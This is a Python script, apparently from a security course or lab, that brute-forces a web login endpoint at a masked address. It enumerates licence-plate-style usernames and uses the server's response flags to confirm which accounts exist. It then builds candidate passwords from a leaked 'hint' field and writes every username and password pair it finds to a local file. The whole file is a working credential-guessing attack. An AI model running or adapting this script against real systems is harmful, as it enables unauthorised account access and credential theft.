# -*- coding: utf-8 -*-
"""
@author: Sreedevi BEENA
"""

import urllib.request    
import string    
import requests
from requests.auth import HTTPBasicAuth

url = 'http://xx.xxx.xxx.xx:xxxx/login/authenticate'
def pswdFinder(eachuser, paswd):
    for i in range(0,len(paswd)):
        for j in range(0,len(paswd)):
            ps = paswd[i] + paswd[j]
            data = {'plate' : eachuser, 'password' : ps, 'name' : 'sreedevi BEENA'}
            r1 = requests.post(url, data )
            result1 = r1.json()
            if result1['flag'] == 5:
                print('%s\t%s' %(eachuser,ps))
                writefile = open("F:\SECURITY\Python_for_security\Found_Usernames_and_passwords.txt",'a')
                writefile.write('%s\t%s\n' %(eachuser,ps))
                writefile.close()

writefile = open("F:\SECURITY\Python_for_security\Found_Usernames_and_passwords.txt",'w')
writefile.write("Username\tPasswords\n")
writefile.close()

for i in range(0,26):
    for j in range(0,26):
        for k in range(1000):
            eachuser = string.ascii_uppercase[i]+ string.ascii_uppercase[j] + "-" +'{0:03}'.format(k) + "-" + string.ascii_uppercase[i]+ string.ascii_uppercase[j]
            data = {'plate' : eachuser, 'password' : 'password', 'name' : 'sreedevi BEENA'}
            r = requests.post(url, data )
            result = r.json()
            if result['flag'] == 4:
                print(eachuser)
                paswd = result['hint'].replace(",\n"," ").replace(".","").split()
                pswdFinder(eachuser, paswd)

